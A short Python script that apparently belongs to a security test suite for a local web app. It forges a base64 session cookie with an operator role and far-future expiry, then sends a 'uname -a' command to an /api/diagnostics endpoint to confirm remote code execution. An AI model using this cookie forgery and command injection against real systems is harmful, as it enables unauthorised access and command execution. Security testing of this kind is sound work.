#!/usr/bin/env python3
"""Attack 5: Remote Code Execution (RCE).

Injects operating system commands through the /api/diagnostics endpoint.
"""

import base64

import requests

BASE_URL = "http://localhost:5000"


def test_attack_5():
    print("[+] Running Individual Attack 5: Remote Code Execution (RCE)...")
    rce_cmd = "uname -a"
    url = f"{BASE_URL}/api/diagnostics"
    token = base64.b64encode(b"operator:operator:9999999999").decode("utf-8")
    cookies = {"session_token": token}
    try:
        response = requests.post(url, json={"cmd": rce_cmd}, cookies=cookies, timeout=5)
        print(f"[*] POST {url} (cmd='{rce_cmd}') - Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[✓] RCE vulnerability confirmed! Command output:")
            print(response.json())
        else:
            print(f"[!] Command execution rejected: {response.text}")
    except Exception as e:
        print(f"[X] Connection error: {e}")


if __name__ == "__main__":
    test_attack_5()
